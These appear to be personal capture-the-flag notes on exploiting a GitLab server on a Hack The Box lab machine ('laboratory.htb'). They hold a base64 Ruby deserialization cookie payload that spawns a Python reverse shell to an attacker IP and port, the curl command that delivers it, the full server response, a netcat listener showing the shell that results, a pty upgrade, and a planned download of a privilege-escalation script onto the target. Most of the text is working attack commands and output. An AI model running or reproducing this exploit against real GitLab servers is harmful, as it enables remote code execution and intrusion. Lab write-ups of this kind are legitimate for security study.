BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAiQBI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMC4xMC4xNC4xNDciLDExMTEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgJmAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--99a3dfcf90767bdb3f0e6ea7bd365b198ca0ad69

# Reverse shell

in one kali shell:
```
┌──(kali㉿kali)-[~]
└─$ nc -l -p 1111
```
in another shell:
```
┌──(kali㉿kali)-[~]
└─$ curl -vvv https://git.laboratory.htb/users/sign_in -k -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAiQBI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMC4xMC4xNC4xNDciLDExMTEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgJmAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--99a3dfcf90767bdb3f0e6ea7bd365b198ca0ad69"
*   Trying 10.10.10.216:443...
* Connected to git.laboratory.htb (10.10.10.216) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=laboratory.htb
*  start date: Jul  5 10:39:28 2020 GMT
*  expire date: Mar  3 10:39:28 2024 GMT
*  issuer: CN=laboratory.htb
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
> GET /users/sign_in HTTP/1.1
> Host: git.laboratory.htb
> User-Agent: curl/7.72.0
> Accept: */*
> Cookie: experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAiQBI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMC4xMC4xNC4xNDciLDExMTEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgJmAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--99a3dfcf90767bdb3f0e6ea7bd365b198ca0ad69
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 24 Dec 2020 01:42:25 GMT
< Server: nginx
< Content-Type: text/html; charset=utf-8
< Vary: Accept-Encoding
< Cache-Control: max-age=0, private, must-revalidate
< Etag: W/"32f29fd5a6784919d009e97f9592ef5a"
< Referrer-Policy: strict-origin-when-cross-origin
< X-Content-Type-Options: nosniff
< X-Download-Options: noopen
< X-Frame-Options: DENY
< X-Permitted-Cross-Domain-Policies: none
< X-Request-Id: nvu8fWRxEz6
< X-Runtime: 0.367507
< X-Ua-Compatible: IE=edge
< X-Xss-Protection: 1; mode=block
< Strict-Transport-Security: max-age=31536000
< Referrer-Policy: strict-origin-when-cross-origin
< Set-Cookie: experimentation_subject_id=IiI%3D--b645bf5e17ecf295f4e614b37fedef6aa712dc32; path=/
< Set-Cookie: _gitlab_session=f3ae89cdbdb20800a5b0857f514bbb66; path=/; expires=Thu, 24 Dec 2020 03:42:25 -0000; HttpOnly
< Transfer-Encoding: chunked
< 
<!DOCTYPE html>
<html class="devise-layout-html">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="Sign in" property="og:title">
<meta content="GitLab Community Edition" property="og:description">
<meta content="http://git.laboratory.htb/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="http://git.laboratory.htb/users/sign_in" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="Sign in" property="twitter:title">
<meta content="GitLab Community Edition" property="twitter:description">
<meta content="http://git.laboratory.htb/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">

<title>Sign in · GitLab</title>
<meta content="GitLab Community Edition" name="description">
<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
<link rel="stylesheet" media="all" href="/assets/application-4a081f9e3a60a0e580cad484d66fbf5a1505ad313280e96728729069f87f856e.css" />
<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />


<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-3144068cf4f603d290f553b653926358ddcd02493b9728f62417682657fc58c0.css" />
<script>
//<![CDATA[
window.gon={};
//]]>
</script>


<script src="/assets/webpack/runtime.f97c5e2d.bundle.js" defer="defer"></script>
<script src="/assets/webpack/main.e4cc9ed0.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.sessions~pages.sessions.new.c3421b50.chunk.js" defer="defer"></script>
<script src="/assets/webpack/pages.sessions.new.859c63c5.chunk.js" defer="defer"></script>

<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="lsU5trlkfKgJV17AsxeMgsyQSY7OKWZX8w3UIgDNyMS0wEJ85lrrYde9EI6VxIc+SO7vi66nZ6cm1MZebb7DFQ==" />

<meta content="origin-when-cross-origin" name="referrer">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<meta content="#474D57" name="theme-color">
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
<meta content="#30353E" name="msapplication-TileColor">




</head>

<body class="application gl-browser-generic gl-platform-other login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">

<script>
//<![CDATA[
gl = window.gl || {};
gl.client = {"isGeneric":true,"isOther":true};


//]]>
</script>
<div class="page-wrap">
<header class="navbar fixed-top navbar-empty">
<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
</svg>

</header>

<div class="login-page-broadcast">


</div>
<div class="container navless-container">
<div class="content">
<div class="flash-container flash-container-page sticky">
</div>

<div class="row mt-3">
<div class="col-sm-12">
<h1 class="mb-3 font-weight-normal">
GitLab Community Edition
</h1>
</div>
</div>
<div class="row mb-3">
<div class="col-sm-7 order-12 order-sm-1 brand-holder">

<h3 class="mt-sm-0">
Open source software to collaborate on code
</h3>
<p>
Manage Git repositories with fine-grained access controls that keep your code secure. Perform code reviews and enhance collaboration with merge requests. Each project can also have an issue tracker and a wiki.
</p>

</div>
<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
<div id="signin-container">
<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
<li class="nav-item" role="presentation">
<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
</li>
<li class="nav-item" role="presentation">
<a class="nav-link" data-qa-selector="register_tab" data-toggle="tab" data-track-event="click_button" data-track-label="sign_in_register" data-track-property="" data-track-value="" href="#register-pane" role="tab">Register</a>
</li>
</ul>

<div class="tab-content">
<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
<div class="login-body">
<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="vgoMhCxwOHM/N2FTgrzO0Jrw7MQpQ8P906eNKzmzFoOcD3dOc06vuuHdLx2kb8VsHo5KwUnNwg0Gfp9XVMAdUg==" /><div class="form-group">
<label for="user_login" class="label-bold">Username or email</label>
<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
</div>
<div class="form-group">
<label class="label-bold" for="user_password">Password</label>
<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
</div>
<div class="remember-me">
<label for="user_remember_me">
<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
<span>Remember me</span>
</label>
<div class="float-right">
<a href="/users/password/new">Forgot your password?</a>
</div>
</div>
<div></div>
<div class="submit-container move-submit-down">
<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
</div>
</form>
</div>
</div>

<div class="tab-pane login-box" id="register-pane" role="tabpanel">
<div class="login-body">
<form class="new_new_user gl-show-field-errors" id="new_new_user" aria-live="assertive" action="/users" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="g2KFClroLQA29/BPOFJURM7tGeY5/7+vxnhh7fagOTKhZ/7ABda6yegdvgEegV/4SpO/41lxvl8ToXORm9My4w==" /><div class="devise-errors">

</div>
<div class="name form-group">
<label class="label-bold" for="new_user_name">Full name</label>
<input class="form-control top js-block-emoji js-validate-length" data-max-length="255" data-max-length-message="Name is too long (maximum is 255 characters)." data-qa-selector="new_user_name_field" required="required" title="This field is required." type="text" name="new_user[name]" id="new_user_name" />
</div>
<div class="username form-group">
<label class="label-bold" for="new_user_username">Username</label>
<input class="form-control middle js-block-emoji js-validate-length js-validate-username" data-max-length="255" data-max-length-message="Username is too long (maximum is 255 characters)." data-qa-selector="new_user_username_field" pattern="[a-zA-Z0-9_\.][a-zA-Z0-9_\-\.]*[a-zA-Z0-9_\-]|[a-zA-Z0-9_]" required="required" title="Please create a username with only alphanumeric characters." type="text" name="new_user[username]" id="new_user_username" />
<p class="validation-error gl-field-error-ignore field-validation hide">Username is already taken.</p>
<p class="validation-success gl-field-error-ignore field-validation hide">Username is available.</p>
<p class="validation-pending gl-field-error-ignore field-validation hide">Checking username availability...</p>
</div>
<div class="form-group">
<label class="label-bold" for="new_user_email">Email</label>
<input class="form-control middle" data-qa-selector="new_user_email_field" required="required" title="Please provide a valid email address." type="email" value="" name="new_user[email]" id="new_user_email" />
</div>
<div class="form-group">
<label class="label-bold" for="new_user_email_confirmation">Email confirmation</label>
<input class="form-control middle" data-qa-selector="new_user_email_confirmation_field" required="required" title="Please retype the email address." type="email" name="new_user[email_confirmation]" id="new_user_email_confirmation" />
</div>
<div class="form-group append-bottom-20" id="password-strength">
<label class="label-bold" for="new_user_password">Password</label>
<input class="form-control bottom" data-qa-selector="new_user_password_field" required="required" pattern=".{8,}" title="Minimum length is 8 characters." type="password" name="new_user[password]" id="new_user_password" />
<p class="gl-field-hint text-secondary">Minimum length is 8 characters</p>
</div>

<div></div>
<div class="submit-container">
<input type="submit" name="commit" value="Register" class="btn-register btn" data-qa-selector="new_user_register_button" data-disable-with="Register" />
</div>
</form></div>
</div>

</div>
</div>

</div>
</div>
</div>
</div>
<hr class="footer-fixed">
<div class="container footer-container">
<div class="footer-links">
<a href="/explore">Explore</a>
<a href="/help">Help</a>
<a href="https://about.gitlab.com/">About GitLab</a>
</div>
</div>

</div>
</body>
</html>
* Connection #0 to host git.laboratory.htb left intact

```

finally:
```
┌──(kali㉿kali)-[~]
└─$ nc -l -p 1111
/bin/sh: 0: can't access tty; job control turned off
$ 

```

# Search user flag
```
$ python3 -c "import pty; pty.spawn('/bin/bash')"
git@git:/assets$ export TERM=xterm

```

### for tomorrow: include in payoad 
-> └─$ python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh', '/var/opt/gitlab
/linpeas.sh')"
 